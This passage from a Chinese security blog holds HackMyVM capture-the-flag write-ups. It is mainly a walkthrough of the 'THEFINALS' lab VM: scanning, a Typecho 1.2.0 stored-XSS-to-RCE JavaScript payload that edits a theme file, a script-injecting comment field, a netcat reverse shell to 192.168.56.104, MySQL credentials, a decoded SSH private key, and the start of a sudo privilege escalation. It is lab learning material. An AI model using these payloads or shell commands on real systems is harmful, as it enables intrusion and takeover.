class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">from flask <span class="hljs-keyword">import</span> Flask, request, jsonify, send_file, render_template<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> shutil<br><br>os_environ[<span class="hljs-string">&#x27;WERKZEUG_DEBUG_PIN&#x27;</span>] = <span class="hljs-string">&#x27;123-456-789&#x27;</span><br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def index():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/id&#x27;</span>)<br>def show_id():<br>    <span class="hljs-keyword">try</span>:<br>        # 执行id命令并获取输出<br>        output = os.popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;id.html&#x27;</span>, id_info=output)<br>    except Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: str(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])<br>def read_page():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;path&#x27;</span> <span class="hljs-keyword">in</span> request.args:<br>        <span class="hljs-keyword">return</span> read_file()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;read.html&#x27;</span>)<br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/move&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def move_page():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">return</span> move_file()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;move.html&#x27;</span>)<br><br>def read_file():<br>    <span class="hljs-keyword">try</span>:<br>        file_path = request.args.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<br>        <span class="hljs-keyword">if</span> not file_path:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;请提供文件路径&#x27;</span>&#125;), <span class="hljs-number">400</span><br>        <br>        <span class="hljs-keyword">if</span> not os.path.exists(file_path):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;文件不存在&#x27;</span>&#125;), <span class="hljs-number">404</span><br>        <br>        # 返回文件内容<br>        <span class="hljs-keyword">return</span> send_file(file_path)<br>    except Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: str(e)&#125;), <span class="hljs-number">500</span><br><br>def move_file():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">data</span> = request.get_json()<br>        source_path = <span class="hljs-keyword">data</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;source&#x27;</span>)<br>        target_path = <span class="hljs-keyword">data</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;target&#x27;</span>)<br>        <br>        <span class="hljs-keyword">if</span> not source_path or not target_path:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;请提供源文件路径和目标路径&#x27;</span>&#125;), <span class="hljs-number">400</span><br>        <br>        <span class="hljs-keyword">if</span> not os.path.exists(source_path):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;源文件不存在&#x27;</span>&#125;), <span class="hljs-number">404</span><br>        <br>        # 确保目标目录存在<br>        target_dir = os.path.dirname(target_path)<br>        <span class="hljs-keyword">if</span> not os.path.exists(target_dir):<br>            os.makedirs(target_dir)<br>        <br>        # 移动文件<br>        shutil.move(source_path, target_path)<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;文件移动成功&#x27;</span>, <span class="hljs-string">&#x27;target_path&#x27;</span>: target_path&#125;)<br>    except Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: str(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=True)<br></code></pre></td></tr></table></figure><p>想法很美好，但是当我们输入&#x2F;tmp&#x2F;app.py时会提示我们文件不存在</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_Q1oTxq2DEF.png"></p><p>这里就是这个靶场考察的一个重点：tmp隔离</p><p>如果系统的systemd开启了PrivateTmp属性，那么这个服务访问到的tmp不是真的tmp路径，而是一个私有的目录，这里就是由apache生成的。</p><p>但是我们不知道这个目录的绝对路径是到底在哪，所以不能用那个文件移动来复制它。</p><p>那么有没有方法绕过隔离呢？答案很简单，我们之所以被隔离是因为我们用的是apache这个服务下面的命令执行来反弹，只要在其他的rce点反弹就行了。</p><p>比如最开始的那个POST注入点。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_WttcLSpweQ.png"></p><p><img src="/2025/05/29/HackMyVM-translate/vmware_tLSYNasyst.png"></p><p>（感谢HYH大佬帮我指出错误，自己当时真尼玛铸币啊，能被这个卡一两个小时，唉。）</p><p>那么就能轻松加愉快的输PIN进到console反弹shell了，剩下的明天再补吧。</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-THEFINALS</title>
    <link href="/2025/05/28/HackMyVM-THEFINALS/"/>
    <url>/2025/05/28/HackMyVM-THEFINALS/</url>
    
    <content type="html"><![CDATA[<p>大佬群友做的靶机。关于如何设置VM和virtualbox联动网上已经有很详细的教程了，这里不再赘述。只提一点，一定要确保靶机环境完全启动之后再进行前期的准备工作（血的教训啊），不过群友做的靶机都很友好，IP直接给了不用arpscan费事扫。</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><hr><p>靶机ip:192.168.56.105</p><p>nmap:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -T4 -A -v 192.168.56.105<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-28 11:11 EDT<br>NSE: Loaded 156 scripts <span class="hljs-keyword">for</span> scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating ARP Ping Scan at 11:11<br>Scanning 192.168.56.105 [1 port]<br>Completed ARP Ping Scan at 11:11, 0.07s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 11:11<br>Completed Parallel DNS resolution of 1 host. at 11:11, 0.03s elapsed<br>Initiating SYN Stealth Scan at 11:11<br>Scanning 192.168.56.105 [1000 ports]<br>Discovered open port 22/tcp on 192.168.56.105<br>Discovered open port 80/tcp on 192.168.56.105<br>Completed SYN Stealth Scan at 11:11, 0.10s elapsed (1000 total ports)<br>Initiating Service scan at 11:11<br>Scanning 2 services on 192.168.56.105<br>Completed Service scan at 11:11, 6.08s elapsed (2 services on 1 host)<br>Initiating OS detection (try <span class="hljs-comment">#1) against 192.168.56.105</span><br>NSE: Script scanning 192.168.56.105.<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.27s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.01s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.105<br>Host is up (0.00076s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 9.9 (protocol 2.0)<br>| ssh-hostkey: <br>|   256 42:a7:04:bb:da:b5:8e:71:7a:89:ff:a4:60:<span class="hljs-built_in">cd</span>:4d:29 (ECDSA)<br>|_  256 37:32:71:ca:3f:11:41:b4:d7:90:1e:c9:7f:e8:bc:20 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Unix))<br>|_http-title: THE FINALS<br>|_http-server-header: Apache/2.4.62 (Unix)<br>| http-methods: <br>|   Supported Methods: GET POST OPTIONS HEAD TRACE<br>|_  Potentially risky methods: TRACE<br>MAC Address: 08:00:27:BD:74:14 (Oracle VirtualBox virtual NIC)<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Uptime guess: 22.031 days (since Tue May  6 10:27:15 2025)<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=265 (Good luck!)<br>IP ID Sequence Generation: All zeros<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.76 ms 192.168.56.105<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.36 seconds<br>           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)<br></code></pre></td></tr></table></figure><p>dirsearch:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">Target: http://192.168.56.105/<br><br>[11:14:29] Starting:                                                                                                                    <br>[11:14:29] 301 -  311B  - /js  -&gt;  http://192.168.56.105/js/                <br>[11:14:30] 403 -  277B  - /.ht_wsr.txt                                      <br>[11:14:30] 403 -  277B  - /.htaccess.orig                                   <br>[11:14:30] 403 -  277B  - /.htaccess.bak1<br>[11:14:30] 403 -  277B  - /.htaccess.sample<br>[11:14:30] 403 -  277B  - /.htaccess.save<br>[11:14:30] 403 -  277B  - /.htaccess_extra                                  <br>[11:14:30] 403 -  277B  - /.htaccess_orig<br>[11:14:30] 403 -  277B  - /.htaccess_sc                                     <br>[11:14:30] 403 -  277B  - /.htaccessBAK<br>[11:14:30] 403 -  277B  - /.htaccessOLD<br>[11:14:30] 403 -  277B  - /.htaccessOLD2<br>[11:14:30] 403 -  277B  - /.htm                                             <br>[11:14:30] 403 -  277B  - /.html                                            <br>[11:14:30] 403 -  277B  - /.htpasswd_test                                   <br>[11:14:30] 403 -  277B  - /.htpasswds<br>[11:14:30] 403 -  277B  - /.httr-oauth<br>[11:14:37] 301 -  313B  - /blog  -&gt;  http://192.168.56.105/blog/            <br>[11:14:37] 200 -   17KB - /blog/                                            <br>[11:14:37] 200 -  820B  - /cgi-bin/printenv                                 <br>[11:14:37] 200 -    1KB - /cgi-bin/test-cgi                                 <br>[11:14:38] 301 -  312B  - /css  -&gt;  http://192.168.56.105/css/              <br>[11:14:40] 301 -  314B  - /fonts  -&gt;  http://192.168.56.105/fonts/          <br>[11:14:41] 200 -  607B  - /images/                                          <br>[11:14:41] 301 -  315B  - /images  -&gt;  http://192.168.56.105/images/<br>[11:14:42] 200 -  695B  - /js/                                              <br>[11:14:47] 301 -  320B  - /screenshots  -&gt;  http://192.168.56.105/screenshots/<br>[11:14:52] 403 -  277B  - /server-status/                                   <br>[11:14:52] 403 -  277B  - /server-status             <br></code></pre></td></tr></table></figure><p>开放80端口，扫到的可访问界面不少，浏览器挨个访问一下。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_PvS2gpMdrb.png"></p><p>这些图片点进去只是图片，没什么隐写之类的，另外两个点进去也都无法访问。</p><p>访问&#x2F;images，看到这里是存放图片的目录，没有其他东西，apache版本2.462，也没有洞可以打。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_kpAyGZ2Nni.png"></p><p>之后访问&#x2F;screenshots，终于有了一点起色，这里的截屏显示了一个博客框架的名称和版本号。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_eBNFTGQFsz.png"></p><p>访问&#x2F;blog，看出这个网站是用的上面提到的框架搭建的，很明显是让我们找这里的exp。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_XSsBYn7cxa.png"></p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr><p>搜索Typecho 1.2.0，得到exp:</p><p><a href="https://blog.csdn.net/m0_73299839/article/details/131939670">typecho存储型xss漏洞复现_存储型xss漏洞无交互-CSDN博客</a></p><p><a href="https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html">Typecho1.2 - 1.2.1-rc前台评论存储xss到rce 漏洞复现-分析-修复 - JunBlog</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 定义一个函数，在网页末尾插入一个iframe元素</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">insertIframe</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 获取当前页面路径</span><br>    <span class="hljs-keyword">var</span> urlWithoutDomain = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>;<br>    <span class="hljs-comment">// 判断页面是否为评论管理页面</span><br>    <span class="hljs-keyword">var</span> hasManageComments = urlWithoutDomain.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;manage-comments.php&quot;</span>);<br>    <span class="hljs-keyword">var</span> tSrc=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (hasManageComments)&#123;<br>        <span class="hljs-comment">// 如果是，则将路径修改为用于修改主题文件的页面地址</span><br>        tSrc=urlWithoutDomain.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;manage-comments.php&#x27;</span>,<span class="hljs-string">&#x27;theme-editor.php?theme=default&amp;file=404.php&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 如果不是，则直接使用主题文件修改页面地址</span><br>        tSrc=<span class="hljs-string">&#x27;/admin/theme-editor.php?theme=default&amp;file=404.php&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">// 定义iframe元素的属性，包括id、src、width、height和onload事件</span><br>    <span class="hljs-keyword">var</span> iframeAttributes = <span class="hljs-string">&quot;&lt;iframe id=&#x27;theme_id&#x27; src=&#x27;&quot;</span>+tSrc+<span class="hljs-string">&quot;&#x27; width=&#x27;0%&#x27; height=&#x27;0%&#x27; onload=&#x27;writeShell()&#x27;&gt;&lt;/iframe&gt;&quot;</span>;<br>    <span class="hljs-comment">// 获取网页原始内容</span><br>    <span class="hljs-keyword">var</span> originalContent = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span>;<br>    <span class="hljs-comment">// 在网页末尾添加iframe元素</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = (originalContent + iframeAttributes);<br>&#125;<br><br><span class="hljs-comment">// 定义一个全局变量isSaved，初始值为false</span><br><span class="hljs-keyword">var</span> isSaved = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">// 定义一个函数，在iframe中写入一段PHP代码并保存</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">writeShell</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 如果isSaved为false</span><br>    <span class="hljs-keyword">if</span> (!isSaved) &#123; <br>        <span class="hljs-comment">// 获取iframe内的内容区域和“保存文件”按钮元素</span><br>        <span class="hljs-keyword">var</span> content = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;theme_id&#x27;</span>).<span class="hljs-property">contentWindow</span>.<span class="hljs-property">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;content&#x27;</span>);<br>        <span class="hljs-keyword">var</span> btns = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;theme_id&#x27;</span>).<span class="hljs-property">contentWindow</span>.<span class="hljs-property">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;button&#x27;</span>);    <br>        <span class="hljs-comment">// 获取模板文件原始内容</span><br>        <span class="hljs-keyword">var</span> oldData = content.<span class="hljs-property">value</span>;<br>        <span class="hljs-comment">// 在原始内容前加入一段phpinfo代码</span><br>        content.<span class="hljs-property">value</span> = (<span class="hljs-string">&#x27;&lt;?php phpinfo(); ?&gt;\n&#x27;</span>) + oldData;<br>        <span class="hljs-comment">// 点击“保存文件”按钮</span><br>        btns[<span class="hljs-number">1</span>].<span class="hljs-title function_">click</span>();<br>        <span class="hljs-comment">// 将isSaved设为true，表示已经完成写入操作</span><br>        isSaved = <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 调用insertIframe函数，向网页中添加iframe元素和写入PHP代码的事件</span><br><span class="hljs-title function_">insertIframe</span>();<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://xxx.xxx.com/<span class="hljs-string">&quot;&gt;&lt;/a&gt;&lt;script/src=http://192.168.56.104:8000/shell.js&gt;&lt;/script&gt;&lt;a/href=&quot;</span>#<br></code></pre></td></tr></table></figure><p>点开文章进行评论，看到我们已经成功上传了文件。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_4t6uYI8d13.png"></p><p>查看exp中的地址&#x2F;usr&#x2F;blog&#x2F;theme&#x2F;default&#x2F;404.php，我们成功执行了phpinfo。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_h6eUy3YBx5.png"></p><p>那接下来就是爽爽的getshell了，传个post一句话冰蝎爽连……好吧爽连不了，不知道怎么回事，只能反弹shell了。</p><p>但是bash没反应。</p><p>把exp改一下改成read &#x2F;etc&#x2F;passwd，查看靶机用的shell名，用的是ash。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">content.<span class="hljs-property">value</span> = (<span class="hljs-string">&#x27;&lt;?php exec(&quot;nc 192.168.56.104 9000 -e /bin/ash&quot;); ?&gt;\n&#x27;</span>) + oldData;<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_7pu2B4xxMb.png"></p><p>查看内部用户名</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_ClVQYvBwBt.png"></p><p>june用户目录是任意用户可访问的，cd到他的目录下拿到userflag</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_XTmKlbv2Vq.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">user：flag&#123;4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298&#125;<br></code></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><hr><p>再回到我们一开始拿到shell的目录下，find一下看看有没有能利用的提权文件，看了一下没有，但是目录下有一个config.php，内容是mysql的用户配置，于是想到利用mysql登录获取数据库里的信息。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_D4ODBatHvI.png"></p><p>给了user，passwd，database，db的权限也写好了，直接登录就好。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -u typecho_u -pQLTkbviW71CSRZtGWIQ<br></code></pre></td></tr></table></figure><p>这里用nc反弹的盲shell登录mysql老是延迟回显，只有在exit的情况下会把表显示出来，气不过回头重新用pty登了一次。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pty是一个python库，用于模拟终端登录过程，渗透测试中常用于升级盲shell，欺骗命令让它们以为自己在正确的终端中被执行<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_XW7n771wDO.png"></p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_99yRkyGWtx.png"></p><p>ok我们把上面staff用户的哈希拿到了，hashcat启动。</p><p>莫得。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/WindowsTerminal_K6lRz3Ommm.png"></p><p>只能再回到shell里，刚刚find查询perm没有结果，那这一次看一看各自用户有没有什么文件可以利用。</p><p>通过查询用户scotty拥有的文件发现了一个日志文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user scotty 2&gt;/dev/null<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/var/log/scotty-main.log<br></code></pre></td></tr></table></figure><p>查看日志，全是给192.168.11.255的广播信息。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_pwkX2gTEvV.png"></p><p>用nc本地监听1337端口，拿到一串不知道是什么的字符串，不过肯定是编码过了。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_mPH6XDjVlM.png"></p><p>赛博厨子magic一下，结果这是用户的私钥文件，结合刚刚的信息，可以ssh登scotty了。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/msedge_gaM3rV5NQC.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br>QyNTUxOQAAACA1wn094phOqsfbo+o3CBYiN3xA16ymKSbX2UY32x/AEwAAAJgDc/YUA3P2<br>FAAAAAtzc2gtZWQyNTUxOQAAACA1wn094phOqsfbo+o3CBYiN3xA16ymKSbX2UY32x/AEw<br>AAAECv7kfeoXOQCi5CRIWdHiDT5upKyY3vQxAlKmxEQzRZLDXCfT3imE6qx9uj6jcIFiI3<br>fEDXrKYpJtfZRjfbH8ATAAAAEnJvb3RAdGhlZmluYWxzLmhtdgECAw==<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_byqcEA4MVJ.png"></p><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>看一下这个用户有什么权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">thefinals:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> scotty on thefinals:<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>Runas and Command-specific defaults <span class="hljs-keyword">for</span> scotty:<br>    Defaults!/usr/sbin/visudo env_keep+=<span class="hljs-string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span><br><br>User scotty may run the following commands on thefinals:<br>    (ALL) NOPASSWD: /sbin/secret<br></code></pre></td></tr></table></figure><p>好吧，nopasswd只有一个，那就用吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">thefinals:~$ <span class="hljs-built_in">sudo</span> /sbin/secret<br>/sbin/secret: line 2: can<span class="hljs-string">&#x27;t create /dev/pts/99: Permission denied</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_5gL49eMJDw.png"></p><p>谔谔你让我创建到第99个shell吗，那很有手速了。</p><p>编写脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">for i in $(seq 1 90); do python -c &#x27;import pty; pty.spawn(&quot;/bin/ash&quot;)&#x27; &amp; 